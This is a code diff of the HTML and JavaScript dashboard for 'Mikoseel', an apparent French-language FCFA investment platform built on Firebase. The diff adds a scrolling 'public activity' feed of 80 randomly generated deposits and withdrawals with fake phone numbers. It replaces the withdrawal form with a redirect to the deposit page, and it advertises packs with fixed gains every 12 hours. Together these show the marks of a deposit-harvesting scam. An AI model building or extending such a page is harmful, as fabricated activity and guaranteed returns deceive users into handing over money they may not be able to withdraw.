@@ -3,8 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Mikoseel — Tableau de bord</title>
-
+<title>Mikoseel — Dashboard</title>
 <style>
 :root{
   --violet-dark:#0c001a;
@@ -13,6 +12,7 @@
   --violet-light:#a855f7;
   --rose:#ec4899;
   --text-light:#e9d5ff;
+  --card-bg: rgba(255,255,255,0.04);
 }
 *{box-sizing:border-box;margin:0;padding:0}
 body{
@@ -21,118 +21,98 @@ body{
   background-size:300% 300%;
   animation:moveBg 18s ease infinite;
   color:var(--text-light);
-  overflow-x:hidden;
   min-height:100vh;
+  overflow-x:hidden;
 }
 @keyframes moveBg{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
 
+/* header */
 header{
   background:linear-gradient(90deg,var(--violet-mid),var(--rose));
   padding:12px 20px;
   display:flex;
   justify-content:space-between;
   align-items:center;
-  position:sticky;top:0;z-index:10;
+  position:sticky;top:0;z-index:20;
 }
-header h1{font-size:20px;margin:0}
+header h1{font-size:18px;margin:0}
 .menu-container{position:relative}
 .menu-btn{background:none;border:none;color:#fff;font-size:22px;cursor:pointer}
 .menu-dropdown{
-  display:none;
-  position:absolute;right:0;top:44px;
-  background:rgba(20,0,40,0.95);
-  border-radius:8px;
-  min-width:220px;
-  box-shadow:0 6px 20px rgba(0,0,0,0.5);
+  display:none;position:absolute;right:0;top:44px;background:rgba(20,0,40,0.95);
+  border-radius:8px;min-width:220px;box-shadow:0 6px 20px rgba(0,0,0,0.5);flex-direction:column;
 }
 .menu-dropdown a,.menu-dropdown button{
-  display:block;width:100%;text-align:left;padding:12px;color:#fff;text-decoration:none;
-  border:none;background:none;cursor:pointer;
+  display:block;width:100%;text-align:left;padding:12px;color:#fff;text-decoration:none;border:none;background:none;cursor:pointer;
 }
-.menu-dropdown a:hover,.menu-dropdown button:hover{background:rgba(236,72,153,0.18)}
+.menu-dropdown a:hover,.menu-dropdown button:hover{background:rgba(236,72,153,0.12)}
 
-.tabs{
-  display:flex;
-  justify-content:center;
-  gap:10px;
-  margin-top:15px;
-}
+/* tabs */
+.tabs{display:flex;justify-content:center;gap:10px;padding:14px 10px;background:transparent}
 .tab-btn{
-  background:rgba(255,255,255,0.08);
-  border:none;
-  padding:10px 16px;
-  border-radius:8px;
-  color:#fff;
-  font-weight:600;
-  cursor:pointer;
-  transition:0.3s;
+  background:rgba(255,255,255,0.06);border:none;padding:9px 16px;border-radius:10px;color:#fff;font-weight:600;cursor:pointer;transition:0.2s;
 }
-.tab-btn.active{
-  background:linear-gradient(90deg,var(--violet-mid),var(--rose));
-  box-shadow:0 0 15px rgba(236,72,153,0.4);
-}
-.tab-btn:hover{transform:scale(1.03)}
+.tab-btn:hover{transform:translateY(-3px)}
+.tab-btn.active{background:linear-gradient(90deg,var(--violet-mid),var(--rose));box-shadow:0 6px 20px rgba(236,72,153,0.18)}
 
-.section{display:none;padding:20px;max-width:1100px;margin:auto;}
-.section.active{display:block;}
-
+/* layout */
+.container{max-width:1200px;margin:16px auto;padding:0 16px}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;align-items:start}
+@media(max-width:980px){.grid{grid-template-columns:1fr}}
 .card{
-  background:rgba(255,255,255,0.05);
-  border-radius:12px;
-  padding:16px;
-  box-shadow:0 4px 15px rgba(0,0,0,0.3);
-  margin-bottom:16px;
+  background:var(--card-bg);
+  padding:14px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.35);
 }
-.card h2{color:var(--violet-light);margin-bottom:8px}
-#balance{font-size:28px;font-weight:700}
-#userEmailDisplay{color:#cbb8ff;margin-top:4px;font-size:14px}
+.card.small{padding:10px}
+.card h2{margin:0 0 8px 0;color:var(--violet-light);font-size:16px}
+#balance{font-size:24px;font-weight:700}
+#userEmailDisplay{font-size:13px;color:#d8c9ff;margin-top:6px}
 
+/* machine grid (in packs tab) */
+.machine-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px}
 .machine-card{
-  background:linear-gradient(180deg,rgba(255,255,255,0.08),rgba(255,255,255,0.03));
-  padding:12px;border-radius:10px;cursor:pointer;transition:.3s;
+  background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+  padding:10px;border-radius:8px;cursor:pointer;border:1px solid rgba(255,255,255,0.02);transition:transform .18s,box-shadow .18s;
 }
-.machine-card:hover{transform:scale(1.04);box-shadow:0 0 18px rgba(236,72,153,0.3)}
+.machine-card:hover{transform:translateY(-6px);box-shadow:0 10px 30px rgba(236,72,153,0.12)}
+.machine-card .small{font-size:12px;opacity:0.95}
 
-.info-block{
-  margin-top:14px;
-  background:rgba(236,72,153,0.08);
-  padding:16px;
-  border-radius:10px;
-  border-left:4px solid var(--rose);
-}
-.info-block h3{margin-bottom:6px;color:var(--rose)}
-.info-block p{color:#e6d6ff;line-height:1.6;font-size:14px}
+/* public activity ticker */
+.public-box{height:180px;overflow:hidden;background:rgba(0,0,0,0.12);border-radius:8px;padding:8px}
+.public-content{position:relative}
+.public-content p{margin:8px 0;line-height:1.3;font-size:13px;color:#fff}
 
-.footer{padding:20px;text-align:center;color:#d8b4fe;font-size:13px}
+/* info blocks below packs */
+.info-cards{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}
+.info-card{flex:1;min-width:220px;background:rgba(236,72,153,0.06);padding:12px;border-radius:8px;border:1px solid rgba(236,72,153,0.08);font-size:13px;line-height:1.5}
 
+/* modal conditions */
 #modalConditions{
-  position:fixed;inset:0;background:rgba(0,0,0,0.85);
-  display:flex;justify-content:center;align-items:center;
-  z-index:1000;backdrop-filter:blur(8px);
+  position:fixed;inset:0;background:rgba(0,0,0,0.75);display:none;align-items:center;justify-content:center;z-index:60;
 }
-.modal-content{
-  background:linear-gradient(180deg,#1f0035,#4c1d95);
-  padding:24px;border-radius:12px;
-  width:90%;max-width:700px;color:#f4eaff;position:relative;
-  box-shadow:0 8px 40px rgba(0,0,0,0.6);
-  max-height:80vh;overflow:auto;
+.modal{
+  width:94%;max-width:720px;background:linear-gradient(180deg,#1b0130,#421a8b);padding:18px;border-radius:10px;color:#fff;position:relative;box-shadow:0 8px 40px rgba(0,0,0,0.6);max-height:80vh;overflow:auto;
 }
-.modal-content h2{color:var(--rose);margin-bottom:12px}
-.close-modal{
-  position:absolute;top:12px;right:14px;
-  background:none;border:none;color:#fff;font-size:22px;cursor:pointer;
-}
+.close-modal{position:absolute;right:12px;top:10px;background:none;border:none;color:#fff;font-size:20px;cursor:pointer}
+
+/* bubbles background */
+.bubbles{position:fixed;inset:0;overflow:hidden;z-index:-1}
+.bubble{position:absolute;border-radius:50%;bottom:-140px;background:radial-gradient(circle at 30% 30%, rgba(236,72,153,0.6), rgba(124,58,237,0.1));animation:rise linear infinite}
+@keyframes rise{from{transform:translateY(0);opacity:0.9}to{transform:translateY(-120vh);opacity:0}}
+
+/* footer */
+.footer{text-align:center;padding:14px;color:#d8b4ff;font-size:13px;margin-top:10px}
 </style>
 </head>
 <body>
 
 <header>
-  <h1>Mikoseel — Tableau de bord</h1>
+  <h1>Mikoseel — Dashboard</h1>
   <div class="menu-container">
     <button id="menuBtn" class="menu-btn">☰</button>
     <div id="menuDropdown" class="menu-dropdown">
       <button id="logoutBtn">Déconnexion</button>
-      <a href="mailto:Smong2025@outlook.fr">Contact support</a>
+      <a href="mailto:Smong2025@outlook.fr">Contact Smong2025@outlook.fr</a>
     </div>
   </div>
 </header>
@@ -140,84 +120,104 @@ header h1{font-size:20px;margin:0}
 <div class="tabs">
   <button class="tab-btn active" data-tab="home">🏠 Accueil</button>
   <button class="tab-btn" data-tab="packs">💰 Packs</button>
-  <button class="tab-btn" data-tab="retrait">💸 Retraits</button>
+  <button class="tab-btn" id="retraitBtn">💸 Retrait</button>
 </div>
 
-<section id="home" class="section active">
-  <div class="card">
-    <h2>Solde</h2>
-    <div id="balance">Chargement...</div>
-    <div id="userEmailDisplay"></div>
-  </div>
+<div class="container">
+  <!-- HOME -->
+  <section id="home" class="section active">
+    <div class="grid">
+      <div class="card">
+        <h2>Solde</h2>
+        <div id="balance">Chargement...</div>
+        <div id="userEmailDisplay"></div>
+      </div>
 
-  <div class="card">
-    <h2>Historique</h2>
-    <ul id="history" style="list-style:none;max-height:200px;overflow:auto;padding:0">
-      <li>Aucune transaction pour le moment</li>
-    </ul>
-  </div>
-</section>
+      <div class="card">
+        <h2>Historique</h2>
+        <ul id="history" style="list-style:none;max-height:160px;overflow:auto;padding:0;margin:0">
+          <li style="padding:6px 0;color:#d6c6ff">Aucune transaction pour le moment</li>
+        </ul>
+      </div>
 
-<section id="packs" class="section">
-  <div class="card">
-    <h2>Choisissez un pack</h2>
-    <div id="machineCards" style="display:grid;gap:10px"></div>
-  </div>
+      <div class="card">
+        <h2>Activité publique</h2>
+        <div class="public-box">
+          <div id="publicContent" class="public-content"></div>
+        </div>
+      </div>
+    </div>
+  </section>
 
-  <div class="info-block">
-    <h3>Comment fonctionnent les Packs ?</h3>
-    <p>
-      Chaque pack représente un niveau d’investissement avec un rendement différent.  
-      Plus le pack est élevé, plus le gain automatique est important.  
-      Les gains s’ajoutent à votre solde toutes les 12 heures après validation.
-    </p>
-    <p>
-      Vous pouvez augmenter de pack à tout moment, mais pas rétrograder.  
-      Les mises à jour sont effectuées automatiquement sur votre compte Firebase.
-    </p>
-  </div>
-</section>
+  <!-- PACKS -->
+  <section id="packs" class="section" style="display:none">
+    <div class="card">
+      <h2>Sélectionnez un pack</h2>
+      <div id="machineCards" class="machine-grid" style="margin-top:8px"></div>
+    </div>
 
-<section id="retrait" class="section">
-  <div class="card">
-    <h2>Effectuer un retrait</h2>
-    <p>Indiquez le montant à retirer et confirmez l’opération.</p>
-    <form id="withdrawForm">
-      <input type="number" id="withdrawAmount" placeholder="Montant à retirer (FCFA)" min="1000" required style="width:100%;padding:10px;border-radius:8px;border:none;margin-top:8px;margin-bottom:10px;">
-      <button type="submit" style="background:linear-gradient(90deg,var(--violet-mid),var(--rose));color:#fff;border:none;padding:10px 16px;border-radius:8px;font-weight:600;cursor:pointer;">Confirmer le retrait</button>
-    </form>
-  </div>
+    <div class="info-cards">
+      <div class="info-card">
+        <h3 style="margin:0 0 8px 0;color:var(--rose)">Détails & fonctionnement</h3>
+        <p>
+          Les packs sont conçus pour offrir une progression stable et mesurée. Chaque pack a une fourchette d'investissement minimale et maximale.
+          Les gains indiqués correspondent à la somme ajoutée toutes les 12 heures. Exemple : Pack Gold (+2000 FCFA / 12h) signifie que votre solde augmente
+          automatiquement de 2000 FCFA toutes les 12 heures après validation.
+        </p>
+        <p>
+          Le mécanisme est automatique : une fois qu'un pack est validé (par vous ou par l'admin), le serveur enregistre l'opération dans votre historique
+          et le premier gain est appliqué immédiatement. Les gains suivants s'appliquent toutes les 12h.
+        </p>
+      </div>
 
-  <div class="info-block">
-    <h3>Informations sur les retraits</h3>
-    <p>
-      Les retraits sont traités automatiquement et sont crédités sur votre compte mobile ou bancaire enregistré.  
-      Le délai moyen est de 5 à 30 minutes selon le volume des transactions en cours.
-    </p>
-    <p>
-      Assurez-vous que votre solde est suffisant avant d’effectuer un retrait.  
-      Les montants inférieurs à 1 000 FCFA ne peuvent pas être traités.
-    </p>
-  </div>
-</section>
+      <div class="info-card">
+        <h3 style="margin:0 0 8px 0;color:var(--rose)">Bonifications & conseils</h3>
+        <p>
+          Conseil : commencez par un pack adapté à votre budget et augmentez progressivement. Le parrainage peut ajouter des bonus ponctuels à votre solde.
+          Conservez des justificatifs (capt. d'écran) pour vos dépôts en cas de validation manuelle.
+        </p>
+        <p>
+          Rappel : les montants listés sont indicatifs et peuvent être ajustés par l'équipe pour garantir la stabilité du système.
+        </p>
+      </div>
+    </div>
+  </section>
 
-<div class="footer">
-  © 2025 Mikoseel — Tous droits réservés. En continuant, vous acceptez nos conditions d’utilisation.
+  <!-- RETRAIT (redirige vers deposit.html) - section kept hidden because we redirect -->
+  <section id="retrait" class="section" style="display:none">
+    <div class="card">
+      <h2>Retrait</h2>
+      <p>Vous serez redirigé vers la page de retrait.</p>
+    </div>
+  </section>
 </div>
+
+<div class="footer">© 2025 Mikoseel — En continuant, vous acceptez nos conditions d’utilisation.</div>
 
 <!-- Modal Conditions -->
 <div id="modalConditions">
-  <div class="modal-content">
+  <div class="modal">
     <button class="close-modal" id="closeModal">✕</button>
-    <h2>Conditions d’utilisation</h2>
-    <p>En utilisant Mikoseel, vous acceptez nos conditions générales et reconnaissez que toute transaction effectuée est enregistrée sur nos serveurs sécurisés Firebase.</p>
-    <p>Vous devez utiliser des informations véridiques. Toute tentative de fraude entraînera la suspension immédiate du compte.</p>
-    <p>Les rendements automatiques sont soumis à nos algorithmes internes et peuvent évoluer selon les conditions du marché.</p>
-    <p>En poursuivant, vous confirmez avoir lu et accepté ces conditions.</p>
+    <h2 style="color:var(--rose);margin-top:6px">Conditions d’utilisation</h2>
+    <p>
+      En accédant à Mikoseel, vous acceptez nos conditions générales. Les transactions sont enregistrées et traitées automatiquement.
+      Veuillez fournir des informations exactes. Toute fraude ou doublon de compte peut entraîner la suspension.
+    </p>
+    <p>
+      Mikoseel se réserve le droit d'ajuster les taux de gains et les conditions d'utilisation afin d'assurer la pérennité de la
+      plateforme et la sécurité des utilisateurs.
+    </p>
+    <p>
+      Les fonds et opérations sont simulés via Firebase pour cette version ; adaptez les règles de validation et les contrôles
+      lorsque vous passez en production réelle.
+    </p>
   </div>
 </div>
 
+<div class="bubbles" id="bubbles"></div>
+
 <script type="module">
+/* ---------- Firebase init ---------- */
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js";
 import { getFirestore, doc, getDoc, setDoc, onSnapshot, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-firestore.js";
 import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-auth.js";
@@ -234,86 +234,173 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const auth = getAuth(app);
 
+/* ---------- UI refs ---------- */
 const balanceEl = document.getElementById('balance');
 const historyEl = document.getElementById('history');
 const userEmailDisplay = document.getElementById('userEmailDisplay');
 const machineCards = document.getElementById('machineCards');
-const withdrawForm = document.getElementById('withdrawForm');
+const publicContent = document.getElementById('publicContent');
+const menuBtn = document.getElementById('menuBtn');
+const menuDropdown = document.getElementById('menuDropdown');
+const logoutBtn = document.getElementById('logoutBtn');
+const modal = document.getElementById('modalConditions');
+const closeModal = document.getElementById('closeModal');
+const retraitBtn = document.getElementById('retraitBtn');
 
+/* ---------- bubbles ---------- */
+function createBubbles(n=28){
+  const container=document.getElementById('bubbles');
+  for(let i=0;i<n;i++){
+    const b=document.createElement('div');
+    b.className='bubble';
+    const size=10+Math.random()*60;
+    b.style.width=b.style.height=size+'px';
+    b.style.left=Math.random()*100+'%';
+    b.style.animationDuration=(6+Math.random()*18)+'s';
+    b.style.animationDelay=(Math.random()*5)+'s';
+    container.appendChild(b);
+  }
+}
+createBubbles();
+
+/* ---------- Tabs behavior ---------- */
 const tabs = document.querySelectorAll('.tab-btn');
 tabs.forEach(tab=>{
-  tab.onclick=()=>{
+  tab.addEventListener('click', ()=>{
+    // Retrait tab must redirect
+    if(tab.id === 'retraitBtn'){
+      // handled below
+      return;
+    }
     tabs.forEach(t=>t.classList.remove('active'));
     tab.classList.add('active');
-    document.querySelectorAll('.section').forEach(sec=>sec.classList.remove('active'));
-    document.getElementById(tab.dataset.tab).classList.add('active');
-  }
+    // sections
+    document.querySelectorAll('.section').forEach(s=>s.style.display='none');
+    const target = document.getElementById(tab.dataset.tab);
+    if(target) target.style.display='block';
+  });
 });
 
+/* ---------- menu ---------- */
+menuBtn.onclick = ()=> menuDropdown.style.display = menuDropdown.style.display === 'block' ? 'none' : 'block';
+document.addEventListener('click', e=>{ if(!menuBtn.contains(e.target) && !menuDropdown.contains(e.target)) menuDropdown.style.display='none'; });
+
+logoutBtn.onclick = async ()=>{
+  try{ await signOut(auth); }catch(e){}
+  sessionStorage.removeItem('loggedEmail');
+  location.href='login.html';
+};
+
+/* ---------- Machines (packs) ---------- */
 const machines=[
   {name:"Pack Bronze",min:2000,max:5000,gain:250},
   {name:"Pack Silver",min:5000,max:10000,gain:900},
   {name:"Pack Gold",min:10000,max:50000,gain:2000},
   {name:"Pack Diamond",min:50000,max:1500000,gain:12000}
 ];
-machines.forEach(m=>{
-  const el=document.createElement('div');
-  el.className='machine-card';
-  el.innerHTML=`<strong>${m.name}</strong><br>
-  Invest: ${m.min.toLocaleString()} - ${m.max.toLocaleString()} FCFA<br>
-  Gain/12h: +${m.gain.toLocaleString()} FCFA`;
-  el.onclick=()=>{
-    const email=sessionStorage.getItem('loggedEmail');
-    window.location.href=`deposit.html?email=${encodeURIComponent(email)}&pack=${m.name}`;
-  };
-  machineCards.appendChild(el);
-});
+function renderMachines(){
+  machineCards.innerHTML='';
+  machines.forEach(m=>{
+    const el=document.createElement('div');
+    el.className='machine-card';
+    el.innerHTML = `<strong>${m.name}</strong><div class="small">Invest: ${m.min.toLocaleString()} - ${m.max.toLocaleString()} FCFA</div><div style="margin-top:6px;font-weight:700">+${m.gain.toLocaleString()} FCFA / 12h</div>`;
+    el.onclick=()=>{
+      const email = currentEmail || sessionStorage.getItem('loggedEmail') || '';
+      if(!email){ alert('Aucun utilisateur connecté.'); return; }
+      const params = new URLSearchParams({ pack: m.name, min: m.min, max: m.max, gain: m.gain, email });
+      window.location.href = `deposit.html?${params.toString()}`;
+    };
+    machineCards.appendChild(el);
+  });
+}
+renderMachines();
 
-let currentEmail=null;
-onAuthStateChanged(auth, async user=>{
-  currentEmail=user?.email||sessionStorage.getItem('loggedEmail');
-  if(!currentEmail) return location.href='login.html';
-  userEmailDisplay.textContent=currentEmail;
-  const userRef=doc(db,'users',currentEmail);
-  const snap=await getDoc(userRef);
-  if(!snap.exists()) await setDoc(userRef,{balance:0,history:[]});
-  onSnapshot(userRef,docSnap=>{
-    const data=docSnap.data();
-    balanceEl.textContent=(data.balance||0).toLocaleString()+" FCFA";
-    const hist=data.history||[];
-    historyEl.innerHTML=hist.length?hist.slice().reverse().map(h=>`<li>${h.date} — ${h.type||'Opération'} ${h.gain?'+ '+h.gain+' FCFA':''}</li>`).join(''):'<li>Aucune transaction</li>';
+/* ---------- Public activity ticker ---------- */
+const fakeActivities = [];
+for(let i=0;i<80;i++){
+  const type = Math.random()>0.6 ? 'Retrait' : 'Dépôt';
+  const amount = Math.floor(Math.random()*49000)+1000;
+  const phone = '+229' + Math.floor(60000000 + Math.random()*39999999);
+  fakeActivities.push(`${type} de ${amount.toLocaleString()} FCFA — ${phone}`);
+}
+let tickerPos = 0;
+function renderPublicActivities(){
+  publicContent.innerHTML = '';
+  fakeActivities.forEach(a=>{
+    const p = document.createElement('p');
+    p.textContent = a;
+    publicContent.appendChild(p);
+  });
+  // animate vertical scroll
+  function step(){
+    tickerPos -= 0.5;
+    if(Math.abs(tickerPos) >= publicContent.scrollHeight) tickerPos = publicContent.parentElement.offsetHeight;
+    publicContent.style.top = tickerPos + 'px';
+    requestAnimationFrame(step);
+  }
+  publicContent.style.position = 'relative';
+  requestAnimationFrame(step);
+}
+renderPublicActivities();
+
+/* ---------- Firestore + Auth ---------- */
+let currentEmail = null;
+let unsubscribe = null;
+
+onAuthStateChanged(auth, async (user) => {
+  currentEmail = user?.email || sessionStorage.getItem('loggedEmail') || null;
+  if(!currentEmail){
+    // no user: redirect to login
+    location.href = 'login.html';
+    return;
+  }
+  userEmailDisplay.textContent = currentEmail;
+
+  const userRef = doc(db, 'users', currentEmail);
+  const snap = await getDoc(userRef);
+  if(!snap.exists()){
+    // create minimal doc if missing
+    await setDoc(userRef, { balance: 0, history: [] }, { merge: true });
+  }
+
+  if(typeof unsubscribe === 'function') unsubscribe();
+
+  unsubscribe = onSnapshot(userRef, (docSnap) => {
+    if(!docSnap.exists()){
+      balanceEl.textContent = "Utilisateur introuvable";
+      historyEl.innerHTML = '<li style="padding:6px 0;color:#d6c6ff">Aucune transaction pour le moment</li>';
+      return;
+    }
+    const data = docSnap.data();
+    balanceEl.textContent = (Number(data.balance) || 0).toLocaleString() + ' FCFA';
+    const hist = data.history || [];
+    if(hist.length === 0){
+      historyEl.innerHTML = '<li style="padding:6px 0;color:#d6c6ff">Aucune transaction pour le moment</li>';
+    } else {
+      // newest first
+      historyEl.innerHTML = hist.slice().reverse().map(h=>{
+        const date = h.date || h.createdAt || new Date().toLocaleString();
+        const type = h.type || 'Opération';
+        const pack = h.pack ? ` - ${h.pack}` : '';
+        const gain = (h.gain !== undefined) ? ` ${h.gain > 0 ? '+' : ''}${Number(h.gain).toLocaleString()} FCFA` : (h.montant ? ` ${h.montant} FCFA` : '');
+        return `<li style="padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)">${date} — ${type}${pack}${gain}</li>`;
+      }).join('');
+    }
   });
 });
 
-withdrawForm.addEventListener('submit',async e=>{
-  e.preventDefault();
-  const amount=parseInt(document.getElementById('withdrawAmount').value);
-  if(isNaN(amount)||amount<1000)return alert("Montant invalide (min. 1000 FCFA)");
-  const userRef=doc(db,'users',currentEmail);
-  const snap=await getDoc(userRef);
-  const bal=snap.data().balance||0;
-  if(amount>bal)return alert("Solde insuffisant");
-  await updateDoc(userRef,{
-    balance:bal-amount,
-    history:arrayUnion({type:'Retrait',gain:-amount,date:new Date().toLocaleString()})
-  });
-  alert("Retrait effectué avec succès !");
-  document.getElementById('withdrawAmount').value="";
+/* ---------- Retrait tab behavior: redirect to deposit.html ---------- */
+retraitBtn.addEventListener('click', ()=>{
+  const email = currentEmail || sessionStorage.getItem('loggedEmail') || '';
+  if(!email){ alert('Aucun utilisateur connecté.'); return; }
+  const params = new URLSearchParams({ email, action: 'retrait' });
+  window.location.href = `deposit.html?${params.toString()}`;
 });
 
-document.getElementById('logoutBtn').onclick=async()=>{
-  await signOut(auth);
-  sessionStorage.removeItem('loggedEmail');
-  location.href='login.html';
-};
+/* ---------- Close modal ---------- */
+closeModal.addEventListener('click', ()=> modal.style.display = 'none');
+window.addEventListener('load', ()=> modal.style.display = 'flex');
 
-document.getElementById('menuBtn').onclick=()=>{
-  const menu=document.getElementById('menuDropdown');
-  menu.style.display=menu.style.display==='block'?'none':'block';
-};
-
-document.getElementById('closeModal').onclick=()=>document.getElementById('modalConditions').style.display='none';
-window.onload=()=>document.getElementById('modalConditions').style.display='flex';
 </script>
 </body>
 </html>
